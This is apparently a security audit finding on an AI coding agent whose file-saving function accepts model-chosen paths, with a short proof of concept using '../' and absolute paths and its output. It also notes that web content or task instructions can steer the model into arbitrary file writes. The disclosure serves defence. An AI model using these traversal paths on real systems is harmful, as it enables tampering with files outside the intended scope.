# F-H-CODEWRITE-1: Model-chosen file paths escape project directory

**Verification: DYNAMICALLY-REPRODUCED** (PoC executed in WSL2; output from real run)

## Description
`Coder.save_code_to_project` in `src/agents/coder/coder.py:68-80` joins the LLM-parsed `file` field with `os.path.join(self.project_dir, project_name, file['file'])` without containment validation. `../` and POSIX absolute paths survive.

## Impact
Web content or task instructions steering model output → server-privilege arbitrary file write.

## PoC
```python
coder.save_code_to_project(
    [{"file": "../poc-escaped/PWNED_CW.txt", "code": "written outside"}], "repo")
Coder("repro").save_code_to_project([{"file": "/tmp/devika_cw_absolute.txt", ...}], "repro")
```

## Execution result
```
[CODEWRITE] relative escape: data/projects/poc-escaped/PWNED_CW.txt created
            absolute escape: /tmp/devika_cw_absolute.txt created
```
